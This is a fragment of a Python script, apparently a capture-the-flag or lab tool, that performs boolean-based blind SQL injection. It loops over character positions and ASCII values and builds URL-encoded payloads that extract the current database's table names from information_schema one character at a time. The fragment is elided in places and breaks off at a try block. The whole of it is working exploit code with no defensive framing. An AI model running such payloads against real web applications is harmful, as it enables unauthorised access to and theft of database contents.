...
def blind_sql(base, cookies, ok):
    ...
    while True:
        ...
        for number in iterate:
            url = base + "?id=1%27%20and%20(ASCII(substring((select%20group_concat(table_name,%200x0a)%20from%20information_schema.tables%20where%20table_schema=database())," + str(col) + ",1))=" + str(number) + ")%20and%20%271%27=%271"
            #print("URL" + url)
            try:
